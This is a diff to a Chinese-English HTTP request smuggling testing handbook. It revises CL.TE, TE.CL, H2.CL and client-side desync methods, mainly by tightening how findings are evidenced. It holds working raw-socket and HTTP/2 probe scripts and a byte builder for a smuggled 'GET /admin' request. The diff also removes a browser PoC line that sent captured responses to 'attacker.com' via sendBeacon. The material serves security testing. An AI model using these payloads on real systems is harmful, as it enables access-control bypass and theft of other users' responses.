@@ -1,10 +1,12 @@
-> 结构：上半原有是主线（CL.TE / TE.CL）；下半补充 + 文末附件加深 H2。先时间差确认再走私。
+> 结构：上半原有是主线（CL.TE / TE.CL）；下半补充 + 文末附件加深 H2。时间差只作线索，再用受控后续请求与原件验证边界差。
 >
 > 与 `src-value-hunting` 冲突时以 rules 为准。只能探到解析差、没有绕 WAF/劫持/投毒 → 默认不写。
 
 ## 一、原有知识库
 
 # HTTP 请求走私测试手册
+
+**发送前：** 明确 H1/H2、TLS SNI/ALPN、前后端转换及连接复用条件，按 `docs/autopilot-lanes.md#wire-and-live-action-boundaries` 核对 `tools/sender_semantics.py --require`。H1 畸形报文用能保留原始字节的发送器，不让客户端重算 CL、重分块或归一化头。HTTP 代码块的排版换行不代替 wire bytes：用 CRLF 和最终编码后的 `len(bytes)` 校验，保留实际请求/响应。省略号示例只讲结构，不能原样发送。超时、400、断连只保留观察，不能单独确认或排除走私；受控基线、唯一标记的后续请求及服务端关联证据才支持结论。
 
 ## 一、HTTP 请求走私原理
 
@@ -109,56 +111,40 @@ Transfer-Encoding:[tab]chunked
 
 ### 3.1 时间差检测
 
+串行交错采样完整 chunked 基线与 CL.TE 等待探针，每次使用新连接。变体的前端 CL 正好读完 `1\r\nZ`，若后端按 chunked 解析则还需 chunk 分隔/结束；相同延迟也可能来自前端读超时。下面只保存首段响应和时间，后续确认须完整捕获并关联受控后续请求。
+
 ```python
+from contextlib import ExitStack
 import socket
+import ssl
 import time
 
-def detect_cl_te(host, port=443):
-    """检测 CL.TE 走私"""
-    
-    # 构造走私请求
-    smuggled = (
-        "POST / HTTP/1.1\r\n"
-        f"Host: {host}\r\n"
-        "Content-Length: 6\r\n"
-        "Transfer-Encoding: chunked\r\n"
-        "\r\n"
-        "0\r\n"
-        "\r\n"
-        "X"
-    )
-    
-    # 发送请求
-    sock = socket.create_connection((host, port))
-    if port == 443:
-        import ssl
-        sock = ssl.wrap_socket(sock)
-    
-    sock.sendall(smuggled.encode())
-    
-    # 立即发送第二个请求
-    normal = (
-        "GET / HTTP/1.1\r\n"
-        f"Host: {host}\r\n"
-        "\r\n"
-    )
-    sock.sendall(normal.encode())
-    
-    # 测量响应时间
-    start = time.time()
-    response = sock.recv(4096)
-    elapsed = time.time() - start
-    
-    sock.close()
-    
-    # 如果响应延迟 > 10s，可能存在走私
-    # 原因: 后端等待走私请求的剩余部分（"X" 后面的内容）
-    if elapsed > 10:
-        print(f"可能存在 CL.TE 走私（延迟 {elapsed:.2f}s）")
-        return True
-    
-    return False
+
+def sample_cl_te(host, port=443, probe=True):
+    body = b"1\r\nZ" if probe else b"0\r\n\r\n"
+    request = (
+        f"POST / HTTP/1.1\r\nHost: {host}\r\n"
+        f"Content-Length: {len(body)}\r\n"
+        "Transfer-Encoding: chunked\r\n\r\n"
+    ).encode("ascii") + body
+    with ExitStack() as stack:
+        sock = stack.enter_context(socket.create_connection((host, port), timeout=10))
+        if port == 443:
+            context = ssl.create_default_context()
+            context.set_alpn_protocols(['http/1.1'])
+            sock = stack.enter_context(context.wrap_socket(sock, server_hostname=host))
+        start = time.monotonic()
+        sock.sendall(request)
+        try:
+            response = sock.recv(4096)
+            outcome = 'response' if response else 'closed'
+        except socket.timeout:
+            response, outcome = b'', 'timeout'
+        return {'request': request, 'response': response, 'outcome': outcome,
+                'elapsed': time.monotonic() - start}
 ```
+
+`response` 仅为首段，不冒称完整原件；超时/断连保留 partial/unknown。没有稳定差分只能说本次未观察到，不能返回“无走私”的技术结论。
 
 ### 3.2 CL.TE 检测 Payload
 
@@ -175,7 +161,7 @@ Q
 
 **预期行为**:
 - 如果返回超时或 400 错误 → 可能存在 CL.TE
-- 原因: 后端读取 chunked 编码，等待 `Q` 后面的数据
+- `Q` 不是合法十六进制 chunk 长度；可能是正确的语法拒绝，也可能未被转发。此简图不能单凭超时/400 判断后端解析，定时探针用上节的精确字节。
 
 ### 3.3 TE.CL 检测 Payload
 
@@ -192,7 +178,7 @@ X
 
 **预期行为**:
 - 如果返回超时 → 可能存在 TE.CL
-- 原因: 后端读取 6 字节（`0\r\n\r\nX`），但前端已认为请求结束
+- 只有前端按 TE 仅转发 5 字节 `0\r\n\r\n` 且保留 CL=6 时，后端才会等第 6 字节；后缀 `X` 可能被前端当作下一请求而拒绝，须核对实际转发边界。
 
 ### 3.4 smuggler.py 工具
 
@@ -316,35 +302,64 @@ Authorization: Bearer INTERNAL_TOKEN
 
 ### 5.1 H2.CL（HTTP/2 → HTTP/1.1 + Content-Length）
 
+HTTP/2 允许 `Content-Length`，但它必须与 DATA 总长度一致。下面是有界的长度不一致探针；它只观察前端是否拒绝/重置，尚未证明 H2→H1 边界差或可利用影响。基线用 `declared_length=50`，变体为 100。发送器若拒绝构造不一致帧，应记录能力不支持，不伪装为目标已修复。
+
 ```python
 import h2.connection
+import h2.events
 import socket
 import ssl
+import time
 
-def h2_smuggling():
-    # 建立 HTTP/2 连接
-    sock = socket.create_connection(('target.com', 443))
-    sock = ssl.wrap_socket(sock)
-    
-    conn = h2.connection.H2Connection()
-    conn.initiate_connection()
-    sock.sendall(conn.data_to_send())
-    
-    # 发送带有 Content-Length 的请求
-    # HTTP/2 不应该有 Content-Length，但降级到 HTTP/1.1 时会保留
-    headers = [
-        (':method', 'POST'),
-        (':path', '/'),
-        (':authority', 'target.com'),
-        (':scheme', 'https'),
-        ('content-length', '100'),  # 恶意 Content-Length
-    ]
-    
-    conn.send_headers(1, headers)
-    conn.send_data(1, b'x' * 50)  # 只发送 50 字节
-    
-    sock.sendall(conn.data_to_send())
+
+def h2_framing_probe(host, port=443, declared_length=100):
+    context = ssl.create_default_context()
+    context.set_alpn_protocols(['h2'])
+    with socket.create_connection((host, port), timeout=5) as tcp:
+        with context.wrap_socket(tcp, server_hostname=host) as sock:
+            if sock.selected_alpn_protocol() != 'h2':
+                raise ValueError('HTTP/2 not negotiated; no H2 probe sent')
+            conn = h2.connection.H2Connection()
+            conn.initiate_connection()
+            authority = host if port == 443 else f'{host}:{port}'
+            conn.send_headers(1, [
+                (':method', 'POST'), (':path', '/'),
+                (':authority', authority), (':scheme', 'https'),
+                ('content-length', str(declared_length)),
+            ])
+            conn.send_data(1, b'x' * 50, end_stream=True)
+            sent = bytearray(conn.data_to_send())
+            sock.sendall(sent)
+            received = bytearray()
+            events = []
+            finished = False
+            deadline = time.monotonic() + 10
+            while len(received) < 65536 and time.monotonic() < deadline:
+                sock.settimeout(max(0.001, deadline - time.monotonic()))
+                try:
+                    chunk = sock.recv(min(16384, 65536 - len(received)))
+                except socket.timeout:
+                    break
+                if not chunk:
+                    break
+                received.extend(chunk)
+                batch = conn.receive_data(chunk)
+                events.extend(batch)
+                pending = conn.data_to_send()
+                if pending:
+                    sock.sendall(pending)
+                    sent.extend(pending)
+                if any(isinstance(e, h2.events.ConnectionTerminated) or
+                       (isinstance(e, (h2.events.StreamEnded, h2.events.StreamReset))
+                        and e.stream_id == 1) for e in batch):
+                    finished = True
+                    break
+            return {'request': bytes(sent), 'response': bytes(received),
+                    'events': events, 'finished': finished}
 ```
+
+`finished=False` 表示观察不完整；RST_STREAM/GOAWAY 或协议异常可能只是正确拒绝。实际 H2.CL 验证仍需证明降级后的 H1 framing 以及受控后续请求的边界差，不能把存在 CL、长度错误或超时当成漏洞。
+
 
 ### 5.2 CRLF 注入在 HTTP/2 头部
 
@@ -566,7 +581,7 @@ def exploit_te_cl(host, port=443):
 
 ### CL.TE first probe (front-end trusts CL, back-end trusts chunked)
 
-Assumption: front end prioritizes `Content-Length`, back end prioritizes `Transfer-Encoding: chunked`. Use a very short CL so the front end accepts a fake end, while the back end continues chunk parsing and leaves remaining bytes for the next request.
+Assumption: front end prioritizes `Content-Length`, back end prioritizes `Transfer-Encoding: chunked`. CL covers the complete body below; the back end ends the first request earlier at the zero chunk, leaving the suffix for the next request. A front end that rejects dual framing or normalizes it may prevent this path.
 
 ```http
 POST / HTTP/1.1
@@ -601,12 +616,29 @@ GET /admin HTTP/1.1
 Host: target.example
 Foo: x
 
+
 0
 
 
 ```
 
-On the wire, the chunk body must be exactly 53 bytes; if you change path/headers, recalculate chunk length and update the hex length line accordingly.
+On the wire, the chunk data is exactly 53 bytes, **followed by its own CRLF delimiter** and then `0\r\n\r\n`. The inner request's final CRLFCRLF belongs to the data and cannot double as that delimiter. Build the bytes explicitly (no network I/O):
+
+```python
+inner = b"GET /admin HTTP/1.1\r\nHost: target.example\r\nFoo: x\r\n\r\n"
+size_line = f"{len(inner):x}\r\n".encode("ascii")
+body = size_line + inner + b"\r\n0\r\n\r\n"
+request = (
+    b"POST / HTTP/1.1\r\nHost: target.example\r\n"
+    b"Content-Type: application/x-www-form-urlencoded\r\n"
+    + f"Content-Length: {len(size_line)}\r\n".encode("ascii")
+    + b"Transfer-Encoding: chunked\r\n\r\n" + body
+)
+assert len(inner) == 0x35 and len(size_line) == 4
+assert body[4 + len(inner):] == b"\r\n0\r\n\r\n"
+```
+
+Recalculate both lengths when path/headers change. This proves the intended framing only; the sender must preserve it and the proxy must actually forward it for TE.CL to be possible.
 
 ### Safety note
 
@@ -674,6 +706,7 @@ GET /admin HTTP/1.1
 Host: target.example
 Foo: x
 
+
 0
 
 
@@ -684,7 +717,7 @@ Explanation:
 - **Back end (CL)**: reads only 4 bytes from the message body start -> `3` `5` `\r` `\n`, marks body complete, and leaves the remaining bytes in the TCP read buffer.
 - **Front end (TE)**: parses full stream as chunked and forwards/consumes `GET /admin...` as body content of the **already-closed first request** (product-dependent); mismatch with back-end boundary interpretation forms TE.CL.
 
-For longer smuggling (e.g., `POST` + `Content-Length: 11` + `x=1`), chunk length is about `76` (hex `0x76` = 118 bytes); `Content-Length: 4` can still pin the back end to reading only the length line.
+For other inner requests, use the byte builder above: chunk size is `len(inner)` in hex, the outer CL is `len(size_line)`, and the chunk delimiter is additional. Do not estimate a length or assume the outer CL stays 4 when the hex line changes width.
 
 **Practical notes**: chunk length must be valid hex; second request must meet target expectations for Host, path, and session cookie; timing window and connection-reuse strategy determine whether you hit another user's request.
 
@@ -1176,26 +1209,31 @@ Client-Side Desync exploits browser `fetch()` API behavior to cause desynchroniz
 
 ### 6.4 JavaScript PoC Template
 
+Use a controlled browser/account and uniquely marked test endpoints. Confirm HTTP/1.1 and actual connection reuse in network/server evidence. `no-cors` responses across origins are opaque: the script cannot read their bodies, status or response mismatch. Cookie/CSP restrictions and transport failure remain separate conditions, not proof of absence. This is an observation template, not an exfiltration proof.
+
 ```javascript
 async function desync(targetUrl, triggerPath, smuggledRequest) {
     const body = smuggledRequest;
 
     // Step 1: Trigger the desync (CL.0 on trigger endpoint)
-    await fetch(targetUrl + triggerPath, {
+    const triggerResponse = await fetch(targetUrl + triggerPath, {
         method: 'POST',
         mode: 'no-cors',
         credentials: 'include',
         body: body
     });
 
-    // Step 2: Follow-up request on (hopefully) same connection
+    await triggerResponse.arrayBuffer();
+
+    // Step 2: The browser decides whether to reuse a connection.
     const response = await fetch(targetUrl + '/api/profile', {
+        mode: 'no-cors',
         credentials: 'include'
     });
+    await response.arrayBuffer();
 
-    // Step 3: Exfiltrate if response is mismatched
-    const data = await response.text();
-    navigator.sendBeacon('https://attacker.com/log', data);
+    // Cross-origin no-cors is opaque; inspect controlled server/network traces.
+    console.log('Probe completed; response type:', response.type);
 }
 
 desync(
@@ -1209,21 +1247,24 @@ desync(
 
 - Browser may use different connections for subsequent requests → desync fails
 - `Connection: close` on server side prevents reuse
-- HTTP/2 to single origin may use single connection (actually helps CSD)
+- The CL.0 browser connection-reuse example requires observed HTTP/1.1 byte-stream desync; HTTP/2 multiplexing on one connection does not provide the same primitive. H2 downgrade is a separate boundary to prove.
 - Same-site cookie policies may limit credential inclusion
 - Hard to reliably predict connection reuse
 
 ### 6.6 CSD via Pause-Based Desync
 
 ```
-1. Server has a timeout: if request body isn't fully received within N seconds, 
-   server sends response and moves on
-2. Attacker sends fetch() with:
-   - Content-Length: 1000 (large)
-   - Actual body: only 50 bytes + smuggled request
-3. Server waits, times out, responds to partial request
-4. Remaining bytes (smuggled request) stay in buffer
-5. Next request on connection processes smuggled bytes
+1. First use a raw HTTP/1.1 sender on a controlled connection to test whether the
+   server responds to a partial body without closing the connection.
+2. Declare the length of the complete planned body, send only its first part,
+   and pause; retain the unsent remainder and exact byte counts.
+3. Only if the response arrives and the connection remains reusable, send the
+   remaining bytes plus a uniquely marked controlled follow-up request.
+4. Correlate which request produced each response; a timeout alone proves nothing.
+5. Browser fetch cannot set Content-Length or freely control H1 body framing.
+   A raw pause result is not a browser CSD proof. Browser streaming support,
+   negotiated protocol, pause behavior and connection reuse must be demonstrated
+   separately; if unavailable, keep that browser path unverified.
 ```
 
 ---
